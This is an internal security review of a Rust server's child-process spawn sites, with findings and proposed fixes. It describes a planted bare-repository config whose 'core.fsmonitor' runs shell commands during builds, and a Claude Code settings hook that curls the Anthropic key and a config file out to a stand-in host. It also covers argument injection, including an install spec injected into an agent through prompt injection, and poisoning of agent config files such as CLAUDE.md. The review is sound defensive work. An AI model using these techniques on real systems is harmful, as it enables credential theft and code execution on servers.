# Review C: host process execution and code-execution surfaces

Scope: every child process spawned from `crates/*/src` (and `build.rs`), plus new surfaces since
2026-10-25 (#73 Claude terminal, #80 portable release, f6c46a4b npm install on change, 0442e980
plugin routes, e4841e5c build agent, 99d70ca5 migrations, f9aa761e checklists). Read-only review:
nothing was built or run. "Verified" means traced end to end in source. "Reported" means the path is
in the source but depends on external tool behaviour (git, Claude Code) that was not run here.

Not re-reported: SECURITY_REVIEW_2026-10 #3, #4, #10, #16, #23, #30, #31 and their fixes
(`is_admin` gating of shell, scripts, check and build; `controls_build`; `.git` path refusal; LSP
on the server's own binary; agent commits with hooks off).

## 1. Spawn sites

Who can reach it:
- **Admin** means an admin session on the admin host, an admin MCP token, or an agent run that
  passes `coding::is_admin`, which excludes triggered and exposed runs.
- **Operator** means the CLI, run by whoever has a shell on the machine.
- **Any** means a code path that non-admins can reach.

Env column: **inherit** means the server's whole environment (DATABASE_URL, PG*, FELDSPAR_*,
FELDSPAR_BACKUP_PASSWORD, cloud credentials, etc.) is passed on. **scrubbed** means `env_clear` plus
an allowlist.

| # | Site | Program / args | Reached by | Inputs from data | Env | Timeout / limits | Sandbox |
|---|------|----------------|-----------|---------------------|-----|------------------|---------|
| 1 | `sc-server/src/terminal.rs:1030` (pty) | `claude` + `--continue`, `--mcp-config <tmp>`, `--strict-mcp-config`, `--append-system-prompt` | Admin (admin-host `AdminSession`, Origin==Host, `ide_terminal_enabled`), max 4 | cwd = app source dir or store root; **Claude Code reads `.claude/`, `CLAUDE.md` from cwd** | scrubbed (`INHERITED_ENV` 9 vars) + `CLAUDE_CONFIG_DIR`, `ANTHROPIC_API_KEY`/`BASE_URL` | none (lives as long as the socket); killed on close/logout (`AdminWatch`) | none, server uid |
| 2 | `sc-server/src/lsp.rs:336` | `--language-server` `--stdio` | Admin, Origin-checked | cwd = store root | inherit | none; killed on close | none |
| 3 | `sc-server/src/browser/driver.rs:~262` (chromiumoxide launch) | configured browser | Admin / admin agent `view_app` | app pages rendered | inherit | request 30s | Chrome sandbox on by default (`browser_sandbox`) |
| 4 | `sc-server/src/browser/driver.rs:629` | `sh -c` watchdog | internal | pid, temp profile path (quotes stripped) | inherit | n/a | n/a |
| 5 | `sc-server/src/browser/detect.rs:103` | browser probe | boot / setup | none | inherit | ? | n/a |
| 6 | `sc-app/src/build.rs:1399` `run_bundler` | `spec.command spec.args` | Admin build, IDE quick-save, admin agent `build_application`/`check`, `sc-check`, CLI | build spec (admin config) + **project files the bundler loads** | inherit | **none** | none |
| 7 | `sc-app/src/build.rs:1496` `NpmScript::run` | `sh -c <package.json script>` (pre/post too) | same as 6 | `package.json` scripts (admin-only write since #16) and files they name (`sh build.sh`, `node scripts/x.js`: **writable below admin**) | inherit + `PATH` with every ancestor `node_modules/.bin` | **none** | none |
| 8 | `sc-app/src/build.rs:1603` `run_install` | `install.command install.args` (npm install) | same as 6. **Since f6c46a4b also every IDE quick-save whose manifests changed** | lockfile/manifest; **every dependency's lifecycle scripts** | inherit (`env_remove(BUILD_TOKEN)` only) | **none** | none |
| 9 | `sc-app/src/build.rs:774` | `tsc --noEmit` / `npm run typecheck` | Admin typecheck, `sc-check` | project | inherit | **none** | none |
| 10 | `sc-app/src/build.rs:1201` `run_target` | target command (module template rendered with app settings, split on spaces) | Admin, build agent | module + app settings | inherit + `spec.env`, minus build token | **none** (kill_on_drop) | none |
| 11 | `sc-app/src/build_cache.rs:292` | `git rev-parse/add -A/check-ignore/write-tree` with scratch index, **cwd = source_dir** | every build (6) | **git repository discovery from source_dir** | inherit | **none** | none |
| 12 | `sc-app/src/scaffold/mod.rs:571` | `git init` | Admin scaffold | project path | inherit | none | none |
| 13 | `sc-files/src/git.rs:910` `GitRepo::run` | git clone/pull/push/add/reset/checkout/clean/commit/status | Admin file-store operations | clone `url` (**no `--`, leading `-` not refused**), branch, pathspecs (validated, `--`), message after `-m` | inherit + `GIT_TERMINAL_PROMPT=0`, `GIT_SSH_COMMAND` (BatchMode) | **none** | none |
| 14 | `sc-files/src/git.rs:242` | `ssh-keygen -t ed25519 -N "" -C saltcorn:<name> -f <path_safe>` | Admin | store name (`path_safe`) | inherit | none | n/a |
| 15 | `sc-module/src/install.rs:599` `Installer::npm` | `npm install … <spec>` / `npm uninstall … <name>` | Admin, admin agent `install_modules` | **spec typed by admin or chosen by the model; no `--`, leading `-` not refused** | inherit | **none** | none (lifecycle scripts run) |
| 16 | `sc-module/src/install.rs:68,89` | `node/npm --version` | Admin UI | none | inherit | none | n/a |
| 17 | `sc-python/src/env.rs:552,667,816` | `python -m venv`, `python -m pip install … <spec>` | Admin, admin agent | **spec: no `--`** (`-r /path`, `--index-url`, `-e` accepted) | inherit | **none** | none |
| 18 | `sc-python/src/env.rs:101,111` | `--version` probes | boot / UI | none | inherit | none | n/a |
| 19 | `sc-stan/src/process.rs:39` | `make <target> STANCFLAGS=…`, compiled model per chain | analytics fit (model editor) | Stan program (no `--allow-undefined`, no CXXFLAGS) | **scrubbed** (`KEPT_ENV` + `STAN_*`) | fit deadline + cancel, own pgroup, PDEATHSIG | none |
| 20 | `sc-stan/src/stanc.rs:66` | `stanc --info --include-paths=. main` | same | Stan program in scratch dir | **scrubbed** | `STANC_TIMEOUT` | none |
| 21 | `sc-stan/src/cmdstan/install.rs:290,324` | `tar -xzf`, `make build -jN` | Operator (`feldspar cmdstan install`) | GitHub release over HTTPS (no checksum) | inherit | none | none |
| 22 | `sc-agent-builtins/src/coding/shell.rs:722` `Spawned::spawn` (used by `shell` and `process`) | `bash -c <model command>` or `docker/podman run … <image> bash -c` | Admin run only (`permit_shell`) | model command; admin-config image | **inherit** + `SHELL_ENV` | per-call timeout (shell); process: run-scoped | `none` (default) or container |
| 23 | `coding/shell.rs:181,292,597` | `docker/podman --version / image inspect / rm -f` | Admin config validation | image (admin) | inherit | 30s on rm | n/a |
| 24 | `coding/process.rs:155,390,422` | runtime probe, `run -d … sleep infinity`, `exec … kill` | Admin run | name validated `[A-Za-z0-9_-]` | inherit | 60s / 10s | container |
| 25 | `coding/script.rs:186` `run_bounded` | `npm run <declared script>` and `check` commands | Admin run (`HOST_CODE_GRANTS`) | script name ∈ package.json keys | inherit | yes (`timeout`) | none |
| 26 | `coding/header.rs:201` | `git -C <scope> rev-parse --show-toplevel`, `git log … -- .` | **Any run, including non-admin and triggered** (session header) | **repository discovery from scope dir** | inherit + prompt off | 60s | none |
| 27 | `coding/snapshot.rs:244` | `git -C <scope> rev-parse/ls-files/diff --name-only HEAD/show` | Admin shell calls | repository discovery from scope dir | inherit | **none (sync, blocking)** | none |
| 28 | `coding/commit.rs:184` | `git rev-parse`, `add`, `commit --no-verify -c core.hooksPath=/dev/null` | `implement_feature` after green check (admin) | discovery from scope dir; message after `-m` | inherit | 60s | none |
| 29 | `sc-cli/src/build_agent.rs` → `run_target` (10) | server-chosen command | build host trusts its server | job spec, zip (`enclosed_name`, symlinks written as files) | inherit (build host) | none | none |
| 30 | `sc-cli/src/setup.rs:478,504,2053,2066,2128,2205,2318,2345` | `id`, `npm --version`, plan steps with sudo, `install -D -m`, `cat` | Operator | host facts | inherit | none | n/a |
| 31 | `sc-cli/src/eval.rs:960` | `sh <task script>` | Operator (eval harness) | repo task scripts | inherit | none | n/a |
| 32 | `sc-cli/build.rs:319` | `npm` at compile time | build machine | n/a | n/a | n/a | n/a |
| 33 | test-only: `sc-error/src/lib.rs:896`, `sc-app/src/scaffold/files.rs:5717`, `sc-app/src/build_cache.rs:336,366,422` | | tests | | | | |

No spawns: `sc-migrate` (99d70ca5), checklists (f9aa761e), `sc-module` Deno workers. The Deno
workers are in-process, and their `PermissionsContainer` leaves `allow_run`/`allow_ffi` unset, so
those are denied. Plugin routes and the heartbeat (0442e980) run inside the same worker.

## 2. Findings

### C1. High (conditional): a planted "bare repository" in an app's source directory runs shell commands in the admin's next build (bypasses the #4/#16 fixes). Reported.

**Evidence.**
- `sc-app/src/build_cache.rs:291-301`: `git_command` runs `git` with `current_dir(source_dir)` and
  no `--git-dir`, `GIT_DIR`, `GIT_CEILING_DIRECTORIES` or `safe.bareRepository`.
- `build_key` (`:108-230`) runs `rev-parse --git-dir`, then `add -A -- .` against a scratch index,
  on every build: Build, IDE quick-save (`build_application_quick`), `check`, and
  `build_application`.
- The same discovery happens in `coding/snapshot.rs:244`, `coding/header.rs:201` (every coding
  session, including non-admin ones) and `coding/commit.rs:184`. It also happens in Claude Code's
  own `git status` inside the terminal (#1).
- The write-side protections do not cover this:
  - `sc-files/src/store_path.rs:195` refuses only a path segment named `.git`.
  - `sc-files/src/access.rs:252-289` (`controls_build`) refuses manifests, `*.config.*`,
    `node_modules/**` and rc files.
  - Neither refuses `HEAD`, `config`, `objects/…` or `refs/…`.

**Mechanism.** At each directory, git's discovery first looks for `<dir>/.git`, then checks whether
`<dir>` is itself a git directory: a valid `HEAD`, an `objects/` directory and a `refs/` directory.
All of these can be plain text files or directories. A planted `config` containing
`core.bare=false`, `core.worktree=.` and `core.fsmonitor="<shell>"` makes git set up a work tree.
`git add` / `git status` / `git diff HEAD` then refresh the index, and git runs the fsmonitor hook
**through the shell**. (`safe.bareRepository` defaults to `all` in current git.)

**Attack.**
1. The app's source is a sub-directory of a repository, with no `.git` of its own. This is the case
   for a git file store with the app in `web/`, or the React scaffold in a store that is already a
   repo (`scaffold/mod.rs:560`).
2. A user below admin plants these files in it: `web/HEAD` (`ref: refs/heads/x`), `web/objects/k`,
   `web/refs/k` and `web/config`. The user can be a store writer, a non-admin chat with a `may_edit`
   coding agent, or a triggered run fed injected text.
3. The next Build, IDE save or admin coding check runs the command as the server user with the full
   environment.

This needs no write to any `controls_build` path.

**Fix.**
- Never let git discover the repository from a directory that untrusted users can write. Resolve
  the repository root once from the store root, which is admin-configured, and pass it explicitly:
  `GIT_DIR=<root>/.git` and `GIT_WORK_TREE=<root>`, or `--git-dir/--work-tree`.
- Always add `-c safe.bareRepository=explicit -c core.fsmonitor=false -c core.hooksPath=/dev/null`,
  plus `GIT_CONFIG_NOSYSTEM=1`.
- Add `HEAD`, `config`, `objects/`, `refs/` and `packed-refs` at a source-dir root to the
  below-admin refusals as a second layer.

**Type-system fix.** A `sc_proc::Git` builder that can only be constructed from a `RepoRoot`. The
only way to get a `RepoRoot` is `RepoRoot::of_store(&LocalStoreRoot)`, which checks `.git` exists
at the store root. `Git::new` always sets the hardening flags. Raw `Command::new("git")` is a
disallowed method (§3).

```rust
pub struct RepoRoot(PathBuf);            // private field; only from a store's configured root
impl RepoRoot { pub fn of_store(root: &LocalStoreRoot) -> Option<RepoRoot> { /* root/.git is a dir */ } }
pub struct Git<'r> { repo: &'r RepoRoot, cmd: HostCommand }
impl<'r> Git<'r> {
    pub fn new(repo: &'r RepoRoot, why: Reason, t: Timeout) -> Self {
        let mut cmd = HostCommand::new(Program::Path("git"), why, t);
        cmd.env("GIT_DIR", repo.0.join(".git")).env("GIT_WORK_TREE", &repo.0)
           .env("GIT_CONFIG_NOSYSTEM", "1").env("GIT_TERMINAL_PROMPT", "0")
           .flags(["-c","safe.bareRepository=explicit","-c","core.fsmonitor=false",
                   "-c","core.hooksPath=/dev/null","-c","protocol.ext.allow=never"]);
        Git { repo, cmd }
    }
    pub fn sub(self, s: GitSub) -> Self { /* enum of allowed subcommands */ }
    pub fn pathspecs(self, p: &[CheckedPathspec]) -> Self { /* pushes "--" first */ }
}
```

### C2. Medium–High: the Claude terminal runs project-controlled Claude Code config (hooks, permissions, CLAUDE.md) from a directory non-admins can write. Reported.

**Evidence.**
- `terminal.rs:316-345` and `:1019-1040`: cwd is the app source dir or the store root.
- `Launch::prepare` (`:642-735`) passes `--strict-mcp-config`, so `.mcp.json` is ignored. Nothing
  disables project settings.
- Claude Code loads these from the project: `.claude/settings.json` and `.claude/settings.local.json`
  (`hooks`: shell commands run on tool events; `permissions.allow` such as `Bash(*)`; `env`),
  `.claude/commands|agents|skills`, and `CLAUDE.md`.
- None of these paths is in `controls_build` (`sc-files/src/access.rs:252`) or the `.git` guard.
  `grep -rn '\.claude' crates/sc-files crates/sc-server` finds nothing.
- `CLAUDE_CONFIG_DIR` is installation-wide (`<data>/claude`). The workspace-trust answer for a
  directory therefore persists across sessions and admins, and hooks added after trust was granted
  are picked up when the next session starts.

**Attack.** A store writer below admin, or a non-admin `may_edit` agent run, writes
`web/.claude/settings.json` with a `SessionStart`/`PreToolUse` hook such as
`curl -d "$ANTHROPIC_API_KEY $(cat /etc/feldspar/feldspar.toml)" https://x`. It can also add
`permissions.allow: ["Bash(*)"]` plus instructions in `CLAUDE.md`. The admin clicks "Build with
Claude", and the hook runs as the server user with no prompt.

**Fix.**
- Below admin, refuse writes to `.claude/**`, `CLAUDE.md`, `CLAUDE.local.md`, `.mcp.json`,
  `AGENTS.md` and `.cursor/**`. Treat them like `controls_build`; better, rename that helper to
  `controls_host_code`.
- Launch with flags that limit setting sources to user scope, where the CLI supports them (e.g.
  `--setting-sources user`), or with a `--settings` file that disables hooks.
- Show a notice in the terminal when the directory contains project settings that a non-admin last
  modified (owner metadata is available).

**Type-system fix.** One `HostCodePath` predicate, used by `check_write`, the agent file tools and
the terminal, so that the list of "files that become code" lives in one place:

```rust
pub enum HostCodeKind { BuildInput, PackageManager, AgentConfig, GitInternals }
pub fn host_code_kind(p: &StorePath) -> Option<HostCodeKind>;
// check_write(.., caller: &FileCaller) -> Result<WriteGrant>; WriteGrant::host_code() only for AdminProof
```

### C3. Medium: build, install, git, LSP, module and pip children inherit the server's whole environment. Third-party npm lifecycle scripts see DB credentials. Since f6c46a4b this happens on IDE save. Verified.

**Evidence.**
- `sc-app/src/build.rs:1201-1205`, `:1399-1403`, `:1496-1508` and `:1603-1607` set `.envs(...)`,
  remove only `BUILD_TOKEN_ENV`, and never call `env_clear`.
- Also without `env_clear`: `sc-module/src/install.rs:599`, `sc-python/src/env.rs:816`,
  `sc-files/src/git.rs:910`, `sc-server/src/lsp.rs:336`, `coding/shell.rs:722`,
  `coding/script.rs:186`.
- Contrast, already done right: `terminal.rs:103-110` (`INHERITED_ENV`) and `sc-stan/src/process.rs:27`
  (`KEPT_ENV`).
- f6c46a4b changed `build_application_quick` (`build.rs:483`) from "no install" to `run_build`. Any
  manifest change now runs `npm install`, including every transitive dependency's
  `preinstall/install/postinstall`, on the admin's next save.
- `sc-server/src/apps.rs:1320-1322` still documents the quick build as "no install". That doc is
  stale.

**Attack.** A compromised or typosquatted transitive dependency in an app's lockfile runs at install
time. It reads `DATABASE_URL`/`PGPASSWORD`/`FELDSPAR_BACKUP_PASSWORD` from `process.env`, plus any
cloud credentials the unit sets, and exfiltrates them.

Same-uid processes can also read `feldspar.toml` and `secrets.key`, so scrubbing is a mitigation and
not a boundary. It still removes the zero-effort route, which is the one supply-chain malware uses,
and the codebase already applies the rule in two places.

**Fix.**
- Use `env_clear()` plus an allowlist (PATH, HOME, LANG, LC_*, TZ, TMPDIR, plus the target's
  declared env) for every child.
- Consider `npm ci --ignore-scripts` (or `--ignore-scripts` with an explicit rebuild allowlist) for
  app installs.
- Fix the stale doc at `apps.rs:1321`.

**Type-system fix.** `HostCommand::new` always calls `env_clear` and adds `EnvPolicy::BASE`. Extra
variables need `.env(k, v)` with `k: EnvName`, a newtype whose constructor rejects
`LD_*`, `DYLD_*`, `NODE_OPTIONS`, `BASH_ENV`, `ENV`, `GIT_*` (except through `Git`) and `PYTHON*`.
Because `std` has no "inherit" escape hatch, inheriting has to be spelled `EnvPolicy::inherit_unsafe(reason)`.
That makes it greppable.

### C4. Medium: no timeout on builds, installs, typechecks, target builds, git operations, module and pip installs. A hung child holds the global `BUILD_LOCK`. Verified.

**Evidence.**
- `build.rs:1335` (`BUILD_LOCK` held across `run_install` + `run_bundler`), `:756` (typecheck) and
  `:1192` (target install) take the lock. No `tokio::time::timeout` exists anywhere in `build.rs`.
  `kill_on_drop` is set only on `run_target`.
- No timeout either in `sc-files/src/git.rs:910`, `sc-module/src/install.rs:599` or
  `sc-python/src/env.rs:816`.
- `coding/snapshot.rs:243` runs a synchronous `std::process::Command::output()` with no bound. If
  it is called on the async path, a stuck git blocks a runtime worker. It is reached through
  `take_async`; confirm that this is `spawn_blocking`.

**Attack / impact.** An npm install waiting on a dead registry, a bundler in watch mode by
misconfiguration, or a `git pull` against a black-holed remote blocks every build, typecheck, IDE
save and coding `check` server-wide until restart. These operations also do not set
`stdin(Stdio::null())`, so a child that prompts inherits the server's stdin.

**Fix / type-system fix.** `HostCommand::new(.., timeout: Timeout)` makes the timeout a required
parameter. `Timeout` has no `Default` and an explicit `Timeout::unbounded(reason)`. Each command
also gets `stdin(null)`, `process_group(0)`, `kill_on_drop` and `PR_SET_PDEATHSIG`. The
group-kill logic already exists in `coding/shell.rs::Spawned` and `sc-stan/src/process.rs`; move it
into the builder.

### C5. Low: argument injection in admin-supplied operands (no `--` separator). Verified (admin-only).

- `sc-files/src/git.rs:472-479`: `git clone [--branch b] <url> <dir>`. A `url` such as
  `--upload-pack=sh -c …` is parsed as an option, because the URL is neither preceded by `--` nor
  checked for a leading `-`. `validate_git_config` (`:173`) does not check either.
- `sc-module/src/install.rs:701-712`: `npm install … <spec>`. The admin types the spec, or the model
  chooses it for `install_modules`.
- `sc-python/src/env.rs:759-762`: `pip install … <spec>`. `-r /etc/…` and `--index-url` are
  accepted.
- `coding/shell.rs:562-582`: the `image` and the store path are interpolated into
  `docker run … -v {dir}:{dir} … <image>`. An image of `--privileged` or `-v=/:/h`, or a path
  containing `:`, changes the sandbox.

All of these need admin configuration, or a model run under an admin. The model case matters for
prompt injection: "install `--registry=http://evil x`". The fix is cheap: push `--` before operands,
or refuse a leading `-`, and use `--mount type=bind,src=…,dst=…`.

**Type-system fix.** Make `Operand` a newtype whose constructor refuses a leading `-`.
`HostCommand::operand()` pushes `--` once before the first operand. Flags come only from
`&'static str` (`.flag("--omit=dev")`), so data cannot become a flag.

```rust
pub struct Operand(OsString);
impl Operand { pub fn new(s: impl Into<OsString>) -> Result<Operand> { /* !starts_with('-') && !contains('\0') */ } }
impl HostCommand {
    pub fn flag(&mut self, f: &'static str) -> &mut Self;
    pub fn flag_value(&mut self, f: &'static str, v: Operand) -> &mut Self; // "--branch", v
    pub fn operand(&mut self, o: Operand) -> &mut Self; // inserts "--" once
}
```

### C6. Low: the terminal's MCP session token is only as strong as "loopback" behind a local reverse proxy. Reported.

`sc-server/src/mcp.rs:202` and `terminal.rs:235-246` accept a `fdterm_` token only from a loopback
peer. `is_loopback` (`mcp.rs:1013`) looks at the TCP peer. Behind nginx or Caddy on the same host,
**every** request is from 127.0.0.1, so the check adds nothing. The route also accepts the token
with `mcp_enabled` off, and `tls.rs:1013` serves it on the plain listener without redirecting.

The token is 256 bits and lives only while a terminal is open, so this is defence in depth only.
Fix: bind the session MCP to a dedicated loopback-only listener, or a Unix socket the CLI is pointed
at, instead of the shared router. A smaller fix is to also require the absence of
`X-Forwarded-For`/`Forwarded`.

### C7. Low: smaller terminal and build issues. Verified.

- **Feature switch is not rechecked.** `ide_terminal_enabled` is read only at upgrade
  (`terminal.rs:376`). Turning the feature off does not end open sessions; the logout and demotion
  watch does. Fix: add a `terminal_off` check to the `AdminWatch` recheck tick.
- **Write-only secret is readable.** The terminal hands an admin the Anthropic provider key in
  `ANTHROPIC_API_KEY` (`terminal.rs:719-724`), and `echo $ANTHROPIC_API_KEY` reads it. Elsewhere
  the UI treats secrets as write-only (`sc-api/src/typescript.rs:2389`). This is accepted by design
  (an admin with a shell can read `secrets.key`), but it should be documented in §12.1.
- **No resource limits on the terminal.** It has no CPU or memory limits and no maximum lifetime.
  The open question in TODO-claude-terminal about cgroups also covers daemonising escapes.
- **PATH search above the store root.** `NpmScript::search_path` (`build.rs:1515-1521`) puts
  `node_modules/.bin` of every ancestor up to `/` ahead of `PATH`, as npm does. A store under a
  world-writable directory such as `/tmp/x/apps` would pick up `/tmp/node_modules/.bin/vite` from
  another local user. Fix: stop at the store root.
- **Build-agent unpack and symlinks.** `sc-server/src/build_archive.rs:74` (build agent): the
  workspace persists per application, and `unpack_project` writes through any symlink a previous
  build left inside it. This is low because the server is trusted by the agent. Fix: unpack into a
  fresh directory, or open each file with `O_NOFOLLOW`.

### C8. Informational: stored code and below-admin build inputs (the open part of #16)

Since #16 a non-admin can no longer write manifests, configs or `node_modules`. Several things the
build still executes remain writable below admin:
- Any file named by a script (`sh build.sh`, `node scripts/gen.mjs`).
- Modules imported by `vite.config.ts` (e.g. `./plugins/x.ts`).
- Astro page frontmatter, which runs in Node during `astro build` (prerender).

#16 already lists these as "Not done". They are restated here only because C1 and C2 are new
members of the same class. The structural fix is the container sandbox for builds, which already
exists for the shell (`coding/shell.rs:Sandbox::Container`).

## 3. Proposed type-system controls (summary)

1. **New crate `sc-proc`, the only place that spawns.** In `clippy.toml`:
   ```toml
   disallowed-methods = [
     { path = "std::process::Command::new",   reason = "spawn through sc_proc::HostCommand" },
     { path = "tokio::process::Command::new", reason = "spawn through sc_proc::HostCommand" },
     { path = "pty_process::Command::new",    reason = "spawn through sc_proc::Pty" },
     { path = "std::process::Command::env_clear", reason = "HostCommand clears env itself" },
   ]
   ```
   `#[allow(clippy::disallowed_methods)]` appears only inside `sc-proc`. Tests are allowed via
   `#[cfg(test)]` modules. Every crate already has `[lints] workspace = true`.

2. **Authority as a parameter.** `HostCommand::new` requires `&impl SpawnAuthority`. Today
   `AdminUser = Option<Uuid>` (`sc-catalog/src/admin_host.rs:39`) proves nothing, and `is_admin`
   checks are repeated by hand in `coding.rs:765`, `build_application.rs:85/115`, `permit_shell` and
   `permit_modules`.
   ```rust
   pub trait SpawnAuthority: sealed::Sealed { fn audit(&self) -> AuditLine; }
   pub struct AdminProof { user: Uuid, session: SessionId }   // minted only by AdminSession::proof()
                                                               // and RunCaller::admin_proof() (untrusted_origin → None)
   pub struct OperatorCli;                                     // minted only in sc-cli main()
   pub struct SystemTask(&'static str);                        // version probes, watchdogs; no data-derived args
   ```
   `sc_app::build_application`, `Installer::install`, `PythonEnvironment::install`,
   `GitRepo::*` and `terminal::Launch` take `&AdminProof`. A trigger-run path then fails to
   compile instead of relying on a runtime check.

3. **A builder with safe defaults.**
   ```rust
   pub struct HostCommand { inner: tokio::process::Command, timeout: Timeout, operands_started: bool }
   impl HostCommand {
       pub fn new(p: Program, auth: &impl SpawnAuthority, t: Timeout) -> Self {
           let mut c = tokio::process::Command::new(p.path());
           c.env_clear().envs(EnvPolicy::BASE.collect())
            .stdin(Stdio::null()).process_group(0).kill_on_drop(true);
           #[cfg(target_os="linux")] unsafe { c.pre_exec(pdeathsig) };
           sc_log::log_info!("spawn {}", auth.audit());
           HostCommand { inner: c, timeout: t, operands_started: false }
       }
       pub fn cwd(&mut self, d: impl Into<WorkDir>) -> &mut Self;   // WorkDir: LocalStoreRoot | Scratch | RepoRoot
       pub fn env(&mut self, k: EnvName, v: impl AsRef<OsStr>) -> &mut Self;
       pub async fn output(self) -> Result<Finished>;                // enforces timeout, kills the group
       pub fn sandbox(self, s: SandboxPolicy) -> HostCommand;        // None | Container{image: ImageRef, net}
   }
   pub enum Program { Path(&'static str), Configured(ConfiguredExe) } // ConfiguredExe: operator config only, absolute
   pub struct Timeout(Duration);                                      // no Default
   ```
4. **`Git` over `RepoRoot`** (C1) and **`Operand`/`--`** (C5), sketched above.
5. **`ImageRef`** for container images, parsed as `[registry/]name[:tag|@digest]` with no leading
   `-`. Bind mounts through `--mount type=bind,src=…,dst=…` built from a `WorkDir`.
6. **`host_code_kind(&StorePath)`**, a single predicate for "a write here becomes server code".
   It covers build inputs, agent config (`.claude/**`, `CLAUDE.md`), and git internals at any
   depth (`HEAD`/`config`/`objects`/`refs` siblings). `check_write` returns a
   `WriteGrant` that only `AdminProof` can widen.

## 4. Checked and sound

- **Terminal WebSocket** (`router.rs:1045-1070`):
  - `AdminSession` extractor, refused for app-host session tokens (`admin_session.rs:217-228`, #15).
  - `upgrade_origin_allowed` (Origin must equal Host; a cookie with no Origin is refused).
  - `AdminWatch` ends the PTY on sign-out, disable or demotion, with a 30s recheck
    (`terminal.rs:915-922`), and kills the whole session plus descendants (`pty::Session::kill`).
  - Bounded at 4 sessions.
- **Terminal launch:**
  - Env allowlist (`INHERITED_ENV`, test `the_server_environment_is_not_inherited_wholesale`).
  - Program located to an absolute path.
  - MCP config written `create_new` + 0600 outside the store, deleted with the session.
  - Token 2×UUIDv4, in memory only, removed on drop. It is refused with `Origin` and revalidated
    against the admin session on each MCP call (`mcp.rs:193-215`).
  - Proxied MCP headers are not written to the config.
- **sc-stan:** scrubbed env, no admin-controlled compiler flags, no `--allow-undefined`, timeouts,
  process-group kill, PDEATHSIG.
- **Coding shell / process / scripts / check / build_application / install_modules:**
  - Admin-only through `is_admin`, which excludes triggered and exposed runs, checked at listing
    and at call.
  - Shell has a per-call timeout and process-group kill; `&` is refused.
  - Process names are validated before they reach `sh -c` in containers.
  - Agent commits use `--no-verify` and `core.hooksPath=/dev/null`.
- **LSP:** runs only the configured `--language-server`, never the store's `node_modules/.bin`
  (#16 fix). `node_modules/**` is not writable below admin.
- **`sc-files` git:** pathspecs validated (no absolute, `..`, leading `-` or `:`) and passed after
  `--`; ssh uses `BatchMode=yes`, `IdentitiesOnly`; `GIT_TERMINAL_PROMPT=0`; `.git` path segments
  are refused for writes.
- **Install stamp (f6c46a4b):** lives inside `node_modules` (admin-only write). It hashes the
  manifests and the install command, and is removed before an install so a failed install leaves
  none.
- **Deno module workers:** in-process; `allow_run`/`allow_ffi` are not granted, and failure to
  parse permissions falls back to `none_without_prompt`.
- **Headless browser:** Chrome sandbox on by default (`config.rs:350`). The watchdog `sh -c` only
  interpolates pids and a temp path with quotes stripped.
- **Build-agent unpack:** `enclosed_name` refuses traversal; symlink entries are written as regular
  files; signing keys are removed after a build. The token is never taken on the command line.
- **`feldspar setup`:** operator-only; its temp file is `create_new` + 0600, and argv is passed as
  a vector (no shell).

## 5. Not covered in depth

- The embedded Python interpreter's `gate.py` denylist (in-process `subprocess`/`ctypes` escapes).
- chromiumoxide's own launch env.
- Whether `Snapshot::take_async` wraps the sync git in `spawn_blocking`.
- Claude Code's exact trust and hook-snapshot semantics in the installed CLI version (C2 is
  reported, not executed).
